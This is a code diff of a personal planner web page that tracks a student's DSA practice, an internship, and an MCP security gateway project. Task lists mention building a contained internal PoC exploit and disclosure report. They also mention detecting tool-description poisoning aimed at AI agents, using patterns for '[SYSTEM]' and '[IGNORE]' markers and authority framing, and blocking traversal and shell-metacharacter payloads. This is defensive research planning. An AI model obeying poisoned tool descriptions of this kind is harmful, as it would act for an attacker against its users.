+      ]},
+      { label:'DSA — daily 2 hrs + OA simulation', tasks:[
+        {t:'Linked lists: Reverse, Merge Two Sorted, Reorder List, Remove Nth From End', tag:'d'},
+        {t:'Trees intro: Invert, Max Depth, Same Tree, Subtree of Another Tree', tag:'d'},
+        {t:'OA simulation Sunday: 2 problems, 70 min, no hints — full simulation', tag:'d'},
       ]},
     ]
   },
   {
     id:'w4',
-    title:'Week 4 — gateway proxy core, trees deep dive', dates:'Jul 7–13',
-    badge:'badge-blue', badgeText:'module B',
+    title:'Week 4 — exploit + impact demo + gateway core', dates:'Jul 7–13',
+    badge:'badge-teal', badgeText:'exploit',
+    alert:'This is the payoff week. Build the PoC that demonstrates real impact — something visual and undeniable. Keep it contained, document everything.',
     sections:[
-      { label:'Project — Mon / Wed / Fri', tasks:[
+      { label:'Internal PoC — exploit + impact demonstration', tasks:[
+        {t:'Build the PoC exploit for best finding: craft the specific payload that demonstrates impact', tag:'x'},
+        {t:'Define "impact" clearly before running: what does success look like?', tag:'x'},
+        {t:'Run exploit in the most contained way possible — dev env, isolated session, logged', tag:'x'},
+        {t:'Capture proof: screenshot, terminal recording, or log output showing the vulnerability', tag:'x'},
+        {t:'Confirm reproducibility once more, then stop active testing', tag:'x'},
+        {t:'Write raw finding notes: vuln description, steps to reproduce, proof artifact, blast radius', tag:'x'},
+      ]},
+      { label:'Project — gateway proxy core', tasks:[
         {t:'Read Python asyncio tutorial: async/await, create_task, bridging two async streams (2 hrs)', tag:'p'},
-        {t:'Implement gateway/proxy.py: MCP server (agent-facing) + MCP client (upstream-facing) in same process', tag:'p'},
+        {t:'Implement gateway/proxy.py: MCP server (agent-facing) + MCP client (upstream) in same asyncio process', tag:'p'},
         {t:'Implement transparent forward: all messages pass through unchanged — verify nothing breaks', tag:'p'},
-        {t:'Add tools/list intercept hook: gateway receives response, passes to inspector before forwarding', tag:'p'},
-        {t:'Test: connect agent → gateway → vulnerable server — confirm baseline pass-through works', tag:'p'},
+        {t:'Add tools/list intercept hook: receives response, passes to inspector before forwarding', tag:'p'},
+        {t:'Test: agent → gateway → vulnerable server — baseline pass-through working', tag:'p'},
       ]},
       { label:'DSA — daily 2 hrs', tasks:[
         {t:'Trees: Level Order Traversal, Right Side View, Count Good Nodes, Validate BST', tag:'d'},
         {t:'Trees: Lowest Common Ancestor, Binary Tree Max Path Sum, Serialize/Deserialize', tag:'d'},
-        {t:'Tries: Implement Trie, Design Add and Search Words, Word Search II', tag:'d'},
-        {t:'Timed session: 3 tree problems, 90 min cold — trees appear in ~25% of FAANG OAs', tag:'d'},
-      ]},
-      { label:'Labelbox', tasks:[
-        {t:'Deploy proxy in observer mode (no blocking) against Burp MCP — share logs with manager', tag:'l'},
+        {t:'Timed session: 3 tree problems, 90 min cold', tag:'d'},
       ]},
     ]
   },
   {
     id:'w5',
-    title:'Week 5 — pre-context inspector, heaps/backtracking', dates:'Jul 14–20',
-    badge:'badge-blue', badgeText:'module B',
+    title:'Week 5 — disclosure doc + inspector + heaps', dates:'Jul 14–20',
+    badge:'badge-purple', badgeText:'disclose',
     sections:[
-      { label:'Project — Mon / Wed / Fri', tasks:[
-        {t:'Implement inspector/poisoning_detector.py: regex patterns for [SYSTEM], [IGNORE], authority framing', tag:'p'},
+      { label:'Internal PoC — responsible disclosure document', tasks:[
+        {t:'Write disclosure_report.md: executive summary, technical detail, PoC steps, proof', tag:'x'},
+        {t:'Map finding to OWASP ASI category + CVSS score estimate', tag:'x'},
+        {t:'Write blast radius section: what could an attacker do with this?', tag:'x'},
+        {t:'Write remediation recommendation: specific, actionable, prioritized', tag:'x'},
+        {t:'Share draft with manager before any wider disclosure', tag:'x'},
+        {t:'Present finding to manager in 1:1 — walk through PoC and disclosure doc together', tag:'x'},
+      ]},
+      { label:'Project — pre-context inspector', tasks:[
+        {t:'Implement inspector/poisoning_detector.py: patterns for [SYSTEM], [IGNORE], authority framing', tag:'p'},
         {t:'Implement inspector/schema_diff.py: hash tools/list on first call, diff every subsequent call', tag:'p'},
-        {t:'Wire inspector into gateway: on detection, log warning + strip the poisoned description', tag:'p'},
-        {t:'Test: fire naive_override payload → gateway intercepts and flags before agent sees it', tag:'p'},
-        {t:'Test: fire steganographic_embed → confirm inspector catches non-obvious framing patterns', tag:'p'},
+        {t:'Wire inspector into gateway: detection → log warning + strip poisoned description', tag:'p'},
+        {t:'Test: naive_override payload → gateway intercepts before agent context', tag:'p'},
+        {t:'Test: steganographic_embed → inspector catches non-obvious authority framing', tag:'p'},
       ]},
       { label:'DSA — daily 2 hrs', tasks:[
-        {t:'Heaps: Kth Largest Element, Last Stone Weight, K Closest Points, Task Scheduler, Find Median', tag:'d'},
-        {t:'Backtracking: Subsets, Combination Sum, Permutations, Word Search, N-Queens', tag:'d'},
-        {t:'Weekend: 2 mediums + 1 hard in 90 min — first hard attempt, document approach even if wrong', tag:'d'},
-        {t:'Sunday retro: re-solve every problem you got wrong this week — no hints', tag:'d'},
+        {t:'Heaps: Kth Largest, Last Stone Weight, K Closest Points, Task Scheduler, Find Median', tag:'d'},
+        {t:'Backtracking: Subsets, Combination Sum, Permutations, Word Search', tag:'d'},
+        {t:'Weekend: 2 mediums + 1 hard in 90 min — first hard attempt', tag:'d'},
       ]},
     ]
   },
   {
     id:'w6',
-    title:'Week 6 — policy engine + argument-level authz, graphs', dates:'Jul 21–27',
-    badge:'badge-blue', badgeText:'module B',
+    title:'Week 6 — policy engine + internship wrap (ends Jul 31)', dates:'Jul 21–31',
+    badge:'badge-amber', badgeText:'crunch',
+    alert:'Internship ends Jul 31. Labelbox deliverables must be complete by end of this week.',
     sections:[
-      { label:'Project — Mon / Wed / Fri', tasks:[
-        {t:'Design policy.yaml schema: allow/deny per tool, path_constraints, command_allowlist, tenant_id', tag:'p'},
+      { label:'Labelbox final deliverables — due Jul 31', tasks:[
+        {t:'Finalize disclosure_report.md — manager sign-off that it is complete and internally published', tag:'x'},
+        {t:'Write 1-page internal security finding summary for broader team (if manager approves)', tag:'x'},
+        {t:'Export observer_notes, audit logs, policy.yaml prototype (within Labelbox policy)', tag:'x'},
+        {t:'Final 1:1: present MCPGuard POC, disclosure doc, recommend gateway adoption', tag:'s'},
+        {t:'Confirm what you can reference publicly — get explicit written OK from manager', tag:'x'},
+      ]},
+      { label:'Project — policy engine + audit log', tasks:[
+        {t:'Design policy.yaml: allow/deny per tool, path_constraints, command_allowlist, tenant_id', tag:'p'},
         {t:'Implement policy/engine.py: loads YAML, evaluates tool call, returns Allow/Deny + reason', tag:'p'},
-        {t:'Implement argument-level checks: path.startswith(allowed_prefix), cmd not in blocklist', tag:'p'},
-        {t:'Wire policy engine into gateway: intercept tools/call, evaluate before forwarding', tag:'p'},
-        {t:'Test: path traversal payload → policy blocks "../" in path argument', tag:'p'},
-        {t:'Test: command injection payload → policy blocks shell metacharacters in cmd argument', tag:'p'},
+        {t:'Implement argument-level checks: path prefix constraint, shell metachar blocklist', tag:'p'},
+        {t:'Implement audit/log.py: append-only JSONL with hash chaining (sha256 of prior entry)', tag:'p'},
+        {t:'Wire policy engine + audit log into gateway', tag:'p'},
+        {t:'Integration test: all 5 payloads through gateway — confirm all blocked', tag:'p'},
+        {t:'Document partial bypass: cross-tool chaining — explain root cause in README', tag:'p'},
+        {t:'Tag v0.2-gateway — Module B complete ✓', tag:'s'},
       ]},
-      { label:'DSA — daily 2 hrs', tasks:[
+      { label:'DSA — Mon–Thu only (Fri off for internship wrap)', tasks:[
         {t:'Graphs BFS/DFS: Number of Islands, Clone Graph, Max Area of Island, Pacific Atlantic', tag:'d'},
-        {t:'Graphs advanced: Course Schedule (topo sort), Number of Connected Components, Graph Valid Tree', tag:'d'},
-        {t:'Timed session: 2 graph problems cold — appear in nearly every FAANG interview loop', tag:'d'},
-      ]},
-      { label:'Labelbox', tasks:[
-        {t:'Enable policy enforcement in Labelbox env — write first real policy.yaml for Burp + Jira MCP', tag:'l'},
-        {t:'Document any blocked calls — this becomes your Labelbox finding section', tag:'l'},
+        {t:'Graphs: Course Schedule (topo sort), Number of Connected Components, Graph Valid Tree', tag:'d'},
+        {t:'Advanced graphs: Dijkstra, Network Delay Time', tag:'d'},
       ]},
     ]
   },
   {
-    id:'w7',
-    title:'Week 7 — audit log + Labelbox wrap (internship ends Jul 31)', dates:'Jul 28–31',
-    badge:'badge-amber', badgeText:'crunch week',
-    sections:[
-      { label:'Project — every day this week (shorter days, high priority)', tasks:[
-        {t:'Implement audit/log.py: append-only JSONL, timestamp + tool + args + decision + reason per entry', tag:'p'},
-        {t:'Implement hash chaining: each entry includes sha256(previous_entry_json) — tamper-evident', tag:'p'},
-        {t:'Wire audit log into all gateway decision points: every intercept and every policy decision', tag:'p'},
-        {t:'Integration test: run full 5-payload attack suite through gateway — confirm all blocked', tag:'p'},
-        {t:'Find and document the partial bypass: cross-tool chaining attack — document honestly', tag:'p'},
-        {t:'Commit and tag: v0.2-gateway — Module B complete ✓', tag:'s'},
-      ]},
-      { label:'Labelbox wrap — must finish by Jul 31', tasks:[
-        {t:'Run report generator (stub) against Labelbox audit logs — produce findings summary', tag:'l'},
-        {t:'Write 1-page internal security finding doc for manager', tag:'l'},
-        {t:'Final 1:1 with manager: present POC, share finding doc, discuss handoff', tag:'l'},
-        {t:'Export any internal notes / configs you want to reference later (within Labelbox policy)', tag:'l'},
-      ]},
-      { label:'DSA — daily 2 hrs (Mon–Thu only this week)', tasks:[
-        {t:'Advanced graphs: Dijkstra, Network Delay Time, Swim in Rising Water', tag:'d'},
-        {t:'DP intro: Climbing Stairs, House Robber, Longest Common Subsequence', tag:'d'},
-      ]},
-    ]
-  },
-  {
-    id:'w8', phase:'Phase 2 — post-internship, full project focus (Aug 1 – Aug 20)', showPhase:true,
-    title:'Week 8 — report generator + DP 1D/2D', dates:'Aug 3–9',
+    id:'w7', phase:'Phase 2 — Post-internship, full project focus (Aug 1–20)', showPhase:true,
+    title:'Week 7 — report generator + DP', dates:'Aug 3–9',
     badge:'badge-green', badgeText:'module C',
     sections:[
-      { label:'Project — more hours available now, push hard', tasks:[
-        {t:'Implement report/generator.py: reads module A JSON + audit log, produces markdown report', tag:'p'},
-        {t:'Report format: summary stats + per-attack table with name, OWASP category, result', tag:'p'},
-        {t:'Run complete end-to-end: attack suite → gateway → report in one command (mcpguard run)', tag:'p'},
-        {t:'Write mcpguard CLI entry point using argparse or click', tag:'p'},
+      { label:'Project — full hours now available', tasks:[
+        {t:'Implement report/generator.py: reads attack JSON + audit log, produces markdown report', tag:'p'},
+        {t:'Report: summary stats, per-attack table with OWASP mapping, audit integrity check', tag:'p'},
+        {t:'Wire mcpguard run CLI: fires attacks → gateway → generates report in one command', tag:'p'},
+        {t:'Plug in a real MCP server (GitHub or filesystem) — confirm gateway works on both', tag:'p'},
         {t:'Write 10 pytest unit tests: policy engine, inspector patterns, hash chain integrity', tag:'p'},
-        {t:'Plug in a real MCP server (GitHub or filesystem) alongside the vulnerable server — confirm gateway works on both', tag:'p'},
       ]},
-      { label:'DSA — daily 2 hrs', tasks:[
-        {t:'DP 1D: Min Cost Climbing Stairs, Decode Ways, Coin Change, Max Product Subarray', tag:'d'},
+      { label:'DSA — daily 2 hrs, no internship overhead', tasks:[
+        {t:'DP 1D: Climbing Stairs, House Robber, Coin Change, Decode Ways, Max Product Subarray', tag:'d'},
         {t:'DP 2D: Unique Paths, Longest Common Subsequence, Edit Distance', tag:'d'},
         {t:'Intervals: Insert Interval, Merge Intervals, Non-Overlapping Intervals, Meeting Rooms II', tag:'d'},
-        {t:'Mock OA Saturday: LeetCode contest mode, 2 problems, 35 min each — track cold-start time', tag:'d'},
+        {t:'Mock OA Saturday: LeetCode contest, 2 problems, 35 min each, no hints', tag:'d'},
       ]},
     ]
   },
   {
-    id:'w9',
-    title:'Week 9 — demo, README, behavioral prep', dates:'Aug 10–16',
+    id:'w8',
+    title:'Week 8 — demo + README + behavioral prep', dates:'Aug 10–16',
     badge:'badge-green', badgeText:'ship',
     sections:[
-      { label:'Project — every day this week', tasks:[
-        {t:'Write README.md: problem statement, architecture diagram, install, demo GIF, OWASP table', tag:'p'},
-        {t:'Record asciinema demo: Act 1 attack fires (60s) → Act 2 gateway blocks (60s) → Act 3 report (30s)', tag:'p'},
-        {t:'Convert asciinema to GIF with agg or OBS — embed at top of README above the fold', tag:'p'},
+      { label:'Project — demo and polish', tasks:[
+        {t:'Write final README.md: problem statement, architecture diagram, OWASP table, install steps', tag:'p'},
+        {t:'Record asciinema: Act 1 attack fires (60s) → Act 2 gateway blocks (60s) → Act 3 report (30s)', tag:'p'},
+        {t:'Convert to GIF with agg — embed at top of README above the fold', tag:'p'},
         {t:'Write CONTRIBUTING.md and SECURITY.md with responsible disclosure policy', tag:'p'},
-        {t:'Publish GitHub release v1.0 with changelog and full OWASP ASI category mapping', tag:'s'},
-        {t:'Post to LinkedIn: 2-sentence announcement + GitHub link + 1 concrete finding from report', tag:'s'},
+        {t:'Publish GitHub release v1.0 with changelog and full OWASP ASI mapping', tag:'s'},
+        {t:'Post to LinkedIn: 2-sentence announcement + GitHub link + 1 concrete finding', tag:'s'},
       ]},
       { label:'DSA — daily 2 hrs', tasks:[
-        {t:'Greedy: Jump Game, Jump Game II, Gas Station, Merge Triplets, Partition Labels', tag:'d'},
-        {t:'Hard problems: Trapping Rain Water, Median of Two Sorted Arrays, Alien Dictionary', tag:'d'},
-        {t:'System design intro: read Hello Interview guide — rate limiting, caching, consistent hashing (2 hrs)', tag:'d'},
+        {t:'Greedy: Jump Game, Jump Game II, Gas Station, Partition Labels, Merge Triplets', tag:'d'},
+        {t:'Hard problems: Trapping Rain Water, Median of Two Sorted Arrays', tag:'d'},
+        {t:'System design intro: Hello Interview guide — rate limiting, caching, consistent hashing', tag:'d'},
         {t:'Mock interview Saturday: Pramp or interviewing.io — first live coding with a stranger', tag:'d'},
       ]},
     ]
   },
   {
-    id:'w10',
-    title:'Week 10 — wrap + CMU transition', dates:'Aug 17–20 (Mon–Thu)',
+    id:'w9',
+    title:'Week 9 — wrap + CMU transition', dates:'Aug 17–20',
     badge:'badge-green', badgeText:'done',
     sections:[
       { label:'Project wrap', tasks:[
-        {t:'Final README pass — have one non-security person read cold, confirm demo is self-explanatory', tag:'p'},
-        {t:'Add "Future work" section to README: semantic classifier, session state graph, measurement study', tag:'p'},
-        {t:'Draft 3-sentence email to Prof. Ram: what you built, the measurement gap, ask for a call', tag:'s'},
+        {t:'Final README pass — non-security person reads cold, confirms demo is self-explanatory', tag:'p'},
+        {t:'Add "Future work" section: semantic classifier, session state graph, measurement study', tag:'p'},
+        {t:'Draft 3-sentence email to Prof. Ram: what you built, measurement gap, ask for a call', tag:'s'},
       ]},
       { label:'DSA final', tasks:[
-        {t:'Retro: list your 5 weakest problem patterns — these become your CMU semester focus areas', tag:'d'},
-        {t:'Re-solve 3 problems you previously failed completely, cold, no hints — prove the growth', tag:'d'},
-        {t:'First full mock behavioral interview: STAR answers for MCPGuard, P1 race condition, Jira migration', tag:'d'},
+        {t:'Retro: list 5 weakest patterns — these become your CMU semester focus', tag:'d'},
+        {t:'Re-solve 3 problems you previously failed, cold, no hints — prove the growth', tag:'d'},
+        {t:'Write STAR behavioral stories: MCPGuard, internal PoC finding, P1 race condition, Jira migration', tag:'d'},
       ]},
-      { label:'CMU prep', tasks:[
-        {t:'Update resume: add MCPGuard bullet — "Built runtime MCP security gateway intercepting tool calls..."', tag:'p'},
-        {t:'Update resume: add Labelbox finding bullet from internship POC', tag:'l'},
-        {t:'Set recruiting calendar reminders: CMU career fair typically late September / early October', tag:'s'},
-        {t:'Research 5 target companies for summer 2027 — confirm they recruit at CMU INI', tag:'s'},
+      { label:'CMU + recruiting prep', tasks:[
+        {t:'Update resume: MCPGuard bullet + internal vuln disclosure bullet under Labelbox', tag:'s'},
+        {t:'Set recruiting calendar reminders: CMU career fair late September / early October', tag:'s'},
+        {t:'Research 5 target companies for summer 2027 — confirm CMU INI recruiting presence', tag:'s'},
       ]},
     ]
   },
 ];
 
-function buildId(wid, si, ti) { return wid + '_' + si + '_' + ti; }
-function saveState() { try { localStorage.setItem(KEY, JSON.stringify(state)); } catch(e) {} }
+// ── ID helpers ──
+function builtId(wid, si, ti)  { return `${wid}_${si}_${ti}`; }
+function customId(wid, idx)    { return `${wid}_c_${idx}`; }
 
+// ── render ──
 function weekHasTags(week, filter) {
   if (filter === 'all') return true;
-  return week.sections.some(s => s.tasks.some(t => t.tag === filter));
+  const inBuilt = week.sections.some(s => s.tasks.some(t => t.tag === filter));
+  const inCustom = (state.custom[week.id] || []).some(t => t.tag === filter);
+  return inBuilt || inCustom || filter === 'c' && inCustom;
 }
 
 function renderWeeks() {
   const container = document.getElementById('weeks-container');
   container.innerHTML = '';
+
   weeks.forEach(week => {
+    // phase divider
     if (week.showPhase) {
-      const div = document.createElement('div');
-      div.className = 'phase-divider';
-      div.innerHTML = `<span>${week.phase}</span><div class="phase-line"></div>`;
-      container.appendChild(div);
+      const d = document.createElement('div');
+      d.className = 'phase-divider';
+      d.innerHTML = `<span>${week.phase}</span><div class="phase-line"></div>`;
+      container.appendChild(d);
     }
 
-    let totalW = 0, doneW = 0;
+    // count tasks
+    let tw = 0, dw = 0;
     week.sections.forEach((s, si) => s.tasks.forEach((_, ti) => {
-      totalW++; if (state[buildId(week.id, si, ti)]) doneW++;
+      tw++; if (state.checks[builtId(week.id, si, ti)]) dw++;
     }));
-    const pct = totalW ? Math.round(doneW / totalW * 100) : 0;
+    (state.custom[week.id] || []).forEach((ct, ci) => {
+      tw++; if (state.checks[customId(week.id, ci)]) dw++;
+    });
+    const pct = tw ? Math.round(dw / tw * 100) : 0;
     const isOpen = week.open ?? false;
     const hidden = !weekHasTags(week, activeFilter) ? ' hidden' : '';
 
@@ -412,39 +503,98 @@ function renderWeeks() {
     card.className = 'week-card' + hidden;
     card.id = 'card-' + week.id;
 
+    // alert
+    const alertHtml = week.alert
+      ? `<div class="alert-box"><strong>Note:</strong> ${week.alert}</div>`
+      : '';
+
+    // built-in sections
     const sectionsHtml = week.sections.map((s, si) => {
       const hasTasks = activeFilter === 'all' || s.tasks.some(t => t.tag === activeFilter);
       if (!hasTasks) return '';
       const tasksHtml = s.tasks.map((task, ti) => {
-        const id = buildId(week.id, si, ti);
-        const done = !!state[id];
-        const tagLabel = {p:'project',d:'dsa',s:'milestone',l:'labelbox'}[task.tag];
+        const id = builtId(week.id, si, ti);
+        const done = !!state.checks[id];
+        const tl = {p:'project',d:'dsa',s:'milestone',l:'admin',x:'internal poc'}[task.tag] || task.tag;
         const hide = activeFilter !== 'all' && task.tag !== activeFilter ? ' style="display:none"' : '';
         return `<div class="task-row"${hide}>
-          <input type="checkbox" id="${id}" ${done?'checked':''} onchange="toggle('${id}',this.checked)">
-          <label for="${id}" class="task-label${done?' done':''}">${task.t}<span class="tag tag-${task.tag}">${tagLabel}</span></label>
+          <input type="checkbox" id="${id}" ${done?'checked':''} onchange="toggleCheck('${id}',this.checked)">
+          <label for="${id}" class="task-label${done?' done':''}">${task.t}<span class="tag tag-${task.tag}">${tl}</span></label>
         </div>`;
       }).join('');
       return `<div class="section-label">${s.label}</div>${tasksHtml}`;
     }).join('');
 
+    // custom tasks
+    const customs = state.custom[week.id] || [];
+    const customHtml = (() => {
+      const visible = customs.filter((_, ci) =>
+        activeFilter === 'all' || activeFilter === 'c' || customs[ci].tag === activeFilter
+      );
+      if (customs.length === 0 && activeFilter !== 'all' && activeFilter !== 'c') return '';
+      if (customs.length === 0) return '';
+      return `<div class="section-label">Your tasks</div>` +
+        customs.map((ct, ci) => {
+          const id = customId(week.id, ci);
+          const done = !!state.checks[id];
+          const hide = activeFilter !== 'all' && activeFilter !== 'c' && ct.tag !== activeFilter ? ' style="display:none"' : '';
+          return `<div class="task-row"${hide}>
+            <input type="checkbox" id="${id}" ${done?'checked':''} onchange="toggleCheck('${id}',this.checked)">
+            <label for="${id}" class="task-label${done?' done':''}">${ct.text}<span class="tag tag-c">custom</span></label>
+            <button class="delete-btn" onclick="deleteCustom('${week.id}',${ci})" title="Delete task">✕</button>
+          </div>`;
+        }).join('');
+    })();
+
+    // add task form
+    const addFormHtml = `
+      <div class="add-task-bar">
+        <button class="add-task-toggle" onclick="toggleAddForm('${week.id}')">
+          <svg width="13" height="13" viewBox="0 0 13 13" fill="none"><path d="M6.5 1v11M1 6.5h11" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+          Add your own task
+        </button>
+        <div class="add-task-form" id="add-form-${week.id}">
+          <div class="add-task-row">
+            <input class="add-task-input" id="add-input-${week.id}" type="text" placeholder="Task description…" onkeydown="if(event.key==='Enter')submitTask('${week.id}')">
+            <select class="add-task-select" id="add-tag-${week.id}">
+              <option value="c">custom</option>
+              <option value="p">project</option>
+              <option value="d">dsa</option>
+              <option value="x">internal poc</option>
+              <option value="s">milestone</option>
+            </select>
+          </div>
+          <div class="add-task-actions">
+            <button class="btn-add" onclick="submitTask('${week.id}')">Add task</button>
+            <button class="btn-cancel" onclick="toggleAddForm('${week.id}')">Cancel</button>
+          </div>
+        </div>
+      </div>`;
+
     card.innerHTML = `
       <div class="week-header" onclick="toggleWeek('${week.id}')">
         <span class="badge ${week.badge}">${week.badgeText}</span>
         <span class="week-title">${week.title}</span>
-        <span class="week-dates">${week.dates}</span>
-        <span class="week-count" id="count-${week.id}">${doneW}/${totalW}</span>
-        <svg class="chevron${isOpen?' open':''}" id="chev-${week.id}" viewBox="0 0 16 16" fill="none" aria-hidden="true">
-          <path d="M4 6l4 4 4-4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
-        </svg>
+        <div class="week-meta">
+          <span class="week-dates-pill">${week.dates}</span>
+          <span class="week-count" id="count-${week.id}">${dw}/${tw}</span>
+          <svg class="chevron${isOpen?' open':''}" id="chev-${week.id}" viewBox="0 0 16 16" fill="none">
+            <path d="M4 6l4 4 4-4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </div>
       </div>
       <div class="mini-prog-wrap"><div class="mini-prog-fill" id="mpf-${week.id}" style="width:${pct}%"></div></div>
-      <div class="week-body${isOpen?' open':''}" id="body-${week.id}">${sectionsHtml}</div>`;
+      <div class="week-body${isOpen?' open':''}" id="body-${week.id}">
+        ${alertHtml}${sectionsHtml}${customHtml}${addFormHtml}
+      </div>`;
+
     container.appendChild(card);
   });
+
   updateStats();
 }
 
+// ── interactions ──
 function toggleWeek(wid) {
   const w = weeks.find(x => x.id === wid);
   if (w) w.open = !w.open;
@@ -452,40 +602,96 @@ function toggleWeek(wid) {
   document.getElementById('chev-' + wid).classList.toggle('open');
 }
 
-function toggle(id, val) {
-  state[id] = val;
-  saveState();
+function toggleCheck(id, val) {
+  state.checks[id] = val; save();
   const lbl = document.querySelector(`label[for="${id}"]`);
   if (lbl) lbl.classList.toggle('done', val);
-  updateStats();
-  updateWeekProgress();
+  updateStats(); updateWeekProgress();
 }
 
+function toggleAddForm(wid) {
+  const form = document.getElementById('add-form-' + wid);
+  const isOpen = form.classList.toggle('open');
+  if (isOpen) {
+    // make sure week body is open
+    const w = weeks.find(x => x.id === wid);
+    if (w && !w.open) toggleWeek(wid);
+    setTimeout(() => document.getElementById('add-input-' + wid)?.focus(), 50);
+  } else {
+    const inp = document.getElementById('add-input-' + wid);
+    if (inp) inp.value = '';
+  }
+}
+
+function submitTask(wid) {
+  const inp = document.getElementById('add-input-' + wid);
+  const sel = document.getElementById('add-tag-' + wid);
+  const text = inp?.value.trim();
+  if (!text) { inp?.focus(); return; }
+  if (!state.custom[wid]) state.custom[wid] = [];
+  state.custom[wid].push({ text, tag: sel?.value || 'c' });
+  save();
+  renderWeeks();
+  // reopen the week and form
+  const w = weeks.find(x => x.id === wid);
+  if (w) w.open = true;
+  // scroll into the card
+  document.getElementById('card-' + wid)?.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+}
+
+function deleteCustom(wid, ci) {
+  if (!state.custom[wid]) return;
+  // also clean up check state
+  const id = customId(wid, ci);
+  delete state.checks[id];
+  // remove task and re-index check keys
+  state.custom[wid].splice(ci, 1);
+  save();
+  const w = weeks.find(x => x.id === wid);
+  if (w) w.open = true;
+  renderWeeks();
+}
+
+// ── stats / progress ──
 function updateWeekProgress() {
   weeks.forEach(week => {
     let tw = 0, dw = 0;
     week.sections.forEach((s, si) => s.tasks.forEach((_, ti) => {
-      tw++; if (state[buildId(week.id, si, ti)]) dw++;
+      tw++; if (state.checks[builtId(week.id, si, ti)]) dw++;
     }));
+    (state.custom[week.id] || []).forEach((_, ci) => {
+      tw++; if (state.checks[customId(week.id, ci)]) dw++;
+    });
     const pf = document.getElementById('mpf-' + week.id);
     const ct = document.getElementById('count-' + week.id);
-    if (pf) pf.style.width = (tw ? Math.round(dw/tw*100) : 0) + '%';
+    if (pf) pf.style.width = (tw ? Math.round(dw / tw * 100) : 0) + '%';
     if (ct) ct.textContent = dw + '/' + tw;
   });
 }
 
 function updateStats() {
-  let total=0,done=0,proj=0,projDone=0,dsa=0,dsaDone=0;
-  weeks.forEach(week => week.sections.forEach((s,si) => s.tasks.forEach((task,ti) => {
-    const chk = !!state[buildId(week.id,si,ti)];
-    total++; if(chk) done++;
-    if(['p','s','l'].includes(task.tag)){proj++;if(chk)projDone++;}
-    if(task.tag==='d'){dsa++;if(chk)dsaDone++;}
-  })));
+  let total=0,done=0,proj=0,projDone=0,dsa=0,dsaDone=0,poc=0,pocDone=0;
+  weeks.forEach(week => {
+    week.sections.forEach((s,si) => s.tasks.forEach((task,ti) => {
+      const chk = !!state.checks[builtId(week.id,si,ti)];
+      total++; if(chk) done++;
+      if(['p','s'].includes(task.tag)){proj++;if(chk)projDone++;}
+      if(task.tag==='d'){dsa++;if(chk)dsaDone++;}
+      if(task.tag==='x'){poc++;if(chk)pocDone++;}
+    }));
+    (state.custom[week.id]||[]).forEach((ct,ci) => {
+      const chk = !!state.checks[customId(week.id,ci)];
+      total++; if(chk) done++;
+      if(['p','s'].includes(ct.tag)){proj++;if(chk)projDone++;}
+      if(ct.tag==='d'){dsa++;if(chk)dsaDone++;}
+      if(ct.tag==='x'){poc++;if(chk)pocDone++;}
+    });
+  });
   const pct = total ? Math.round(done/total*100) : 0;
   document.getElementById('s-done').textContent = done;
   document.getElementById('s-proj').textContent = projDone;
   document.getElementById('s-dsa').textContent = dsaDone;
+  document.getElementById('s-poc').textContent = pocDone;
   document.getElementById('s-pct').textContent = pct + '%';
   document.getElementById('main-prog').style.width = pct + '%';
   document.getElementById('prog-label').textContent = done + ' of ' + total + ' tasks complete';
@@ -499,8 +705,8 @@ function setFilter(filter, btn) {
 }
 
 function resetAll() {
-  if (!confirm('Reset all checkboxes? This cannot be undone.')) return;
-  state = {}; saveState();
+  if (!confirm('Reset all checkboxes and delete all custom tasks? This cannot be undone.')) return;
+  state = { checks: {}, custom: {} }; save();
   weeks.forEach(w => w.open = w.id === 'w0');
   renderWeeks();
 }
